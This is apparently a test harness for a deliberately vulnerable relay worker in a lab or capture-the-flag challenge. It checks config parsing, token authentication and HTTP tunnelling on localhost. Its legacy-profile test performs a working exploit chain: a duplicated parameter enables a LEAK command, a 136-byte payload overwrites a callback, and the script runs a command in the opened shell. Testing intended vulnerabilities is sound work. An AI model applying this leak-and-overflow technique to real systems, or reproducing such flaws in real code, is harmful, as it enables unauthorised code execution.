#!/usr/bin/env python3
"""Exercise the production native Worker and intentional callback-overwrite path."""

from __future__ import annotations

import os
import signal
import socket
import socketserver
import struct
import subprocess
import tempfile
import threading
import time
import uuid
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
WORKER_DIR = ROOT / "worker"
BINARY = WORKER_DIR / "relay-worker"
TOKEN = "0123456789abcdef0123456789abcdef0123456789abcdef"


def section(title: str) -> None:
    print(f"\n=== {title} ===", flush=True)


def check(description: str) -> None:
    print(f"[PASS] {description}", flush=True)


def case(description: str) -> None:
    print(f"[CASE] {description}", flush=True)


def recv_line(sock: socket.socket) -> bytes:
    data = bytearray()
    while not data.endswith(b"\n"):
        chunk = sock.recv(1)
        if not chunk:
            break
        data.extend(chunk)
    return bytes(data)


def free_worker_port() -> int:
    for port in range(25000, 25100):
        with socket.socket() as probe:
            try:
                probe.bind(("127.0.0.1", port))
            except OSError:
                continue
            return port
    raise AssertionError("no free Worker test port")


HEALTH_BODY = b"RelayForge HTTP endpoint healthy\n"
LANDING_BODY = (
    b"<!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\">"
    b"<title>RelayForge endpoint</title></head><body>"
    b"<h1>RelayForge endpoint reached</h1>"
    b"<p>This is a fake flag: RF{browser_tunnel_success}</p>"
    b"</body></html>\n"
)


class BackendHandler(socketserver.BaseRequestHandler):
    def handle(self) -> None:
        self.request.settimeout(3)
        request = bytearray()
        while b"\r\n\r\n" not in request and len(request) < 8192:
            chunk = self.request.recv(min(1024, 8192 - len(request)))
            if not chunk:
                break
            request.extend(chunk)
        if request.startswith(b"GET / HTTP/1.1\r\n") and b"\r\n\r\n" in request:
            body = LANDING_BODY
            content_type = b"text/html; charset=utf-8"
            status = b"200 OK"
        elif request.startswith(b"GET /health HTTP/1.1\r\n") and b"\r\n\r\n" in request:
            body = HEALTH_BODY
            content_type = b"text/plain; charset=utf-8"
            status = b"200 OK"
        else:
            body = b"Not Found\n"
            content_type = b"text/plain; charset=utf-8"
            status = b"404 Not Found"
        response = (
                b"HTTP/1.1 " + status + b"\r\n"
                b"Content-Type: " + content_type + b"\r\n"
                + f"Content-Length: {len(body)}\r\n".encode("ascii")
                + b"Cache-Control: no-store\r\n"
                + b"X-Content-Type-Options: nosniff\r\n"
                + b"Referrer-Policy: no-referrer\r\n"
                + b"Connection: close\r\n\r\n"
                + body
            )
        self.request.sendall(response)


class BackendServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True


def write_config(
    directory: Path,
    options: str,
    *,
    target_host: str = "127.0.0.1",
    target_port: str = "19001",
) -> tuple[Path, str]:
    job = str(uuid.uuid4())
    path = directory / "worker.conf"
    path.write_text(
        f"token={TOKEN}\n"
        f"job={job}\n"
        f"duration=30\n"
        f"target_host={target_host}\n"
        f"target_port={target_port}\n"
        f"options={options}\n",
        encoding="ascii",
    )
    path.chmod(0o600)
    return path, job


def start_worker(options: str) -> tuple[subprocess.Popen[bytes], tempfile.TemporaryDirectory[str], int, str]:
    temporary = tempfile.TemporaryDirectory(prefix="relayforge-worker-")
    work = Path(temporary.name)
    config, job = write_config(work, options)
    port = free_worker_port()
    process = subprocess.Popen(
        [str(BINARY), str(port), str(config)],
        cwd=work,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        start_new_session=True,
    )
    deadline = time.monotonic() + 3
    while time.monotonic() < deadline:
        if process.poll() is not None:
            stdout, stderr = process.communicate()
            raise AssertionError(f"Worker exited early: {stdout!r} {stderr!r}")
        if (work / "ready").exists():
            return process, temporary, port, job
        time.sleep(0.02)
    stop_worker(process, temporary)
    raise AssertionError("Worker did not become ready")


def stop_worker(process: subprocess.Popen[bytes], temporary: tempfile.TemporaryDirectory[str]) -> None:
    if process.poll() is None:
        try:
            os.killpg(process.pid, signal.SIGTERM)
        except ProcessLookupError:
            pass
        try:
            process.wait(timeout=2)
        except subprocess.TimeoutExpired:
            try:
                os.killpg(process.pid, signal.SIGKILL)
            except ProcessLookupError:
                pass
            process.wait(timeout=2)
    temporary.cleanup()


def authenticate(port: int, token: str = TOKEN) -> tuple[socket.socket, str]:
    client = socket.create_connection(("127.0.0.1", port), timeout=3)
    client.sendall(f"TOKEN {token}\n".encode())
    banner = recv_line(client).decode("ascii")
    assert banner.startswith("RelayForge worker job="), banner
    return client, banner.removeprefix("RelayForge worker job=").strip()


def browser_get(port: int, token: str, path: str = "/") -> bytes:
    client = socket.create_connection(("127.0.0.1", port), timeout=3)
    client.sendall(
        f"GET /relay/{token}{path} HTTP/1.1\r\n".encode("ascii")
        + b"Host: relay.test\r\nConnection: close\r\n\r\n"
    )
    client.settimeout(3)
    response = bytearray()
    while True:
        chunk = client.recv(4096)
        if not chunk:
            break
        response.extend(chunk)
    client.close()
    return bytes(response)


def request_health_through_tunnel(port: int, expected_job: str) -> None:
    tunnel, observed_job = authenticate(port)
    assert observed_job == expected_job
    assert recv_line(tunnel) == b"OK\n"
    tunnel.sendall(b"CONNECT\n")
    assert recv_line(tunnel) == b"CONNECTED\n"
    tunnel.sendall(
        b"GET /health HTTP/1.1\r\n"
        b"Host: endpoint.test\r\n"
        b"Connection: close\r\n\r\n"
    )
    tunnel.settimeout(3)
    response = bytearray()
    while True:
        chunk = tunnel.recv(4096)
        if not chunk:
            break
        response.extend(chunk)
    tunnel.close()
    assert bytes(response).startswith(b"HTTP/1.1 200 OK\r\n"), bytes(response)
    assert b"Connection: close\r\n" in response, bytes(response)
    assert response.endswith(b"\r\n\r\n" + HEALTH_BODY), bytes(response)
    check("authenticated CONNECT relayed the exact HTTP health response")


def test_malformed_config() -> None:
    section("reject malformed input")
    malformed = [
        "profile=safe",
        "profile=safe&note=UPPER",
        "profile=safe&note=x&unknown=y",
        "profile=safe&note=x&note=y",
        "profile=safe&note=x&profile=legacy&extra=y",
        "profile=safe&note=x&profile=legacy&profile=safe",
        "profile=safe&note=" + "a" * 33,
        "profile=safe%26note=x",
    ]
    for options in malformed:
        case(f"reject malformed options {options!r}")
        with tempfile.TemporaryDirectory(prefix="relayforge-invalid-") as name:
            directory = Path(name)
            config, _ = write_config(directory, options)
            result = subprocess.run(
                [str(BINARY), "25099", str(config)],
                cwd=directory,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=3,
                check=False,
            )
            assert result.returncode == 65, (options, result)
    check(f"rejected all {len(malformed)} malformed options strings with exit code 65")

    malformed_targets = [
        ("0.0.0.0", "19001"),
        ("224.0.0.1", "19001"),
        ("255.255.255.255", "19001"),
        ("localhost", "19001"),
        ("127.1", "19001"),
        ("127.000.000.001", "19001"),
        ("::1", "19001"),
        ("127.0.0.1", "0"),
        ("127.0.0.1", "65536"),
        ("127.0.0.1", "+80"),
        ("127.0.0.1", "http"),
    ]
    for target_host, target_port in malformed_targets:
        case(f"reject target {target_host!r}:{target_port!r}")
        with tempfile.TemporaryDirectory(prefix="relayforge-invalid-target-") as name:
            directory = Path(name)
            config, _ = write_config(
                directory,
                "profile=safe&note=portal",
                target_host=target_host,
                target_port=target_port,
            )
            result = subprocess.run(
                [str(BINARY), "25099", str(config)],
                cwd=directory,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=3,
                check=False,
            )
            assert result.returncode == 65, ((target_host, target_port), result)
    check(f"rejected all {len(malformed_targets)} invalid endpoint combinations")


def test_safe_worker() -> None:
    section("")
    process, temporary, port, job = start_worker("profile=safe&note=portal")
    try:
        print(f"[INFO] Worker ready on 127.0.0.1:{port} for job {job}", flush=True)
        assert TOKEN not in process.args, "token leaked into Worker argv"
        check("session token is absent from the process argument list")
        wrong = socket.create_connection(("127.0.0.1", port), timeout=3)
        wrong.sendall(b"TOKEN " + b"f" * 48 + b"\n")
        assert recv_line(wrong) == b"ERR auth\n"
        wrong.close()
        check("incorrect 48-hex token is rejected")

        missing = browser_get(port, "")
        assert missing.startswith(b"HTTP/1.1 403 Forbidden\r\n"), missing
        wrong_browser = browser_get(port, "f" * 48)
        assert wrong_browser.startswith(b"HTTP/1.1 403 Forbidden\r\n"), wrong_browser
        browser = browser_get(port, TOKEN)
        assert browser.startswith(b"HTTP/1.1 200 OK\r\n"), browser
        assert browser.endswith(b"\r\n\r\n" + LANDING_BODY), browser
        check("temporary browser URL authenticated and reached the private HTML endpoint")

        request_health_through_tunnel(port, job)

        client, observed_job = authenticate(port)
        assert observed_job == job
        assert recv_line(client) == b"OK\n"
        client.sendall(b"LEAK\n")
        assert recv_line(client) == b"ERR command\n"
        check("safe profile rejects the legacy LEAK command")
        client.sendall(b"QUIT\n")
        client.close()
    finally:
        stop_worker(process, temporary)


def test_legacy_worker() -> None:
    section("test legacy profile (the intended vuln btw)")
    process, temporary, port, job = start_worker(
        "profile=safe&note=quarterly&profile=legacy"
    )
    try:
        print(f"[INFO] Worker ready on 127.0.0.1:{port} for job {job}", flush=True)
        print(
            "[INFO] Config starts with safe and ends with legacy; LEAK will prove "
            "that the Worker uses the last profile",
            flush=True,
        )
        request_health_through_tunnel(port, job)

        client, observed_job = authenticate(port)
        assert observed_job == job
        assert recv_line(client) == b"OK\n"
        client.sendall(b"LEAK\n")
        leak = recv_line(client)
        assert leak.startswith(b"worker_shell=0x"), leak
        address = int(leak.split(b"=", 1)[1], 16)
        check(
            "last-profile legacy mode enabled LEAK and returned "
            "worker_shell's address"
        )
        exploit = b"A" * 128 + struct.pack("<Q", address)
        print(
            "[INFO] Sending 136-byte payload: 128 bytes of padding plus "
            "the leaked 8-byte callback address",
            flush=True,
        )
        client.sendall(f"OVERFLOW {len(exploit)}\n".encode() + exploit)
        opened = recv_line(client)
        assert b"relay shell opened" in opened, opened
        check("callback overwrite redirected execution to worker_shell")
        client.sendall(b"printf '__UID__'; id -u; printf '__END__\\n'\n")
        client.settimeout(3)
        output = bytearray()
        while b"__END__" not in output:
            chunk = client.recv(512)
            if not chunk:
                break
            output.extend(chunk)
        assert b"__UID__" in output and b"__END__" in output, bytes(output)
        check("opened shell executed a command and returned delimited output")
        client.close()
    finally:
        stop_worker(process, temporary)


def main() -> None:
    section("build worker")
    print(f"[INFO] Building from {WORKER_DIR}", flush=True)
    subprocess.run(["make", "-C", str(WORKER_DIR), "clean", "all"], check=True)
    check("production relay-worker compiled successfully")
    try:
        section("sample disposable endpoint for tunnel")
        try:
            backend = BackendServer(("127.0.0.1", 19001), BackendHandler)
        except OSError as exc:
            raise SystemExit(f"FAIL: test backend port 19001 unavailable: {exc}") from exc
        thread = threading.Thread(target=backend.serve_forever, daemon=True)
        thread.start()
        check("HTTP fixture is listening on 127.0.0.1:19001")
        try:
            test_malformed_config()
            test_safe_worker()
            test_legacy_worker()
        finally:
            backend.shutdown()
            backend.server_close()
            thread.join(timeout=2)
            check("HTTP fixture stopped cleanly")
    finally:
        subprocess.run(["make", "-C", str(WORKER_DIR), "clean"], check=False)
        check("compiled Worker test artifact removed")
    section("test complete :D")
    print("PASS: production Worker parser, auth, HTTP tunnel, leak, overwrite, and shell")


if __name__ == "__main__":
    main()
